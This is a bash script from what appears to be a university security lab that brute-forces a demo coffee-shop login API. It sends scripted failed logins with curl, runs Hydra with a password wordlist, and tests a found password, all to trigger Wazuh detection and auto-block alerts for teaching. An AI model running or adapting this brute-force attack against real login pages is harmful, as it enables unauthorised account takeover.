#!/bin/bash
# =============================================================================
# Attack Script 03: Brute-Force Login Attack
# CIS 3353 Security Lab - Run from Kali container
# =============================================================================
# Demonstrates: Password brute-forcing against the coffee shop login
# Module: 5 (Endpoint Vulnerabilities), 8 (Security Monitoring)
# Expected Wazuh alerts: Failed logins (100121), Brute-force (100122/100123)
# Active Response: Auto-block after severe brute-force (100300)
# =============================================================================

TARGET="${TARGET_IP:-10.10.0.20}"
RESULTS="/root/results/exploits"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "============================================="
echo "  PHASE 3: BRUTE-FORCE LOGIN ATTACK"
echo "  Target: http://${TARGET}/api/login.php"
echo "  Time: $(date)"
echo "============================================="

mkdir -p ${RESULTS}

# -----------------------------------------------
# Step 1: Manual failed login attempts
# -----------------------------------------------
echo ""
echo "[3.1] Generating failed login attempts (manual)..."
for i in $(seq 1 10); do
    echo -n "  Attempt $i: "
    curl -s -X POST "http://${TARGET}/api/login.php" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"wrongpass${i}\"}" \
        | jq -r '.error // .message // "unknown"'
    sleep 0.5
done
echo "  >> 10 failed attempts sent. Check Wazuh for brute-force alert."

# -----------------------------------------------
# Step 2: Hydra brute-force with custom wordlist
# -----------------------------------------------
echo ""
echo "[3.2] Running Hydra brute-force..."
echo "  Using wordlist: /root/wordlists/coffee-passwords.txt"
hydra -l admin -P /root/wordlists/coffee-passwords.txt \
    ${TARGET} http-post-form \
    "/api/login.php:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid credentials:H=Content-Type\: application/json" \
    -t 4 -w 1 -o ${RESULTS}/hydra_results_${TIMESTAMP}.txt 2>&1 | tee -a ${RESULTS}/hydra_output_${TIMESTAMP}.txt

echo ""
echo "[3.3] Testing discovered credentials..."
# Try the password that was found
curl -s -X POST "http://${TARGET}/api/login.php" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"coffee123"}' \
    | jq . | tee ${RESULTS}/credential_verify_${TIMESTAMP}.json

echo ""
echo "============================================="
echo "  BRUTE-FORCE ATTACK COMPLETE"
echo "  Results: ${RESULTS}/"
echo "  Expected Wazuh alerts:"
echo "    - 100121: Individual failed logins"
echo "    - 100122: Brute-force threshold (5 in 60s)"
echo "    - 100123: Severe brute-force (20 in 120s)"
echo "    - 100300: Active response auto-block trigger"
echo "============================================="
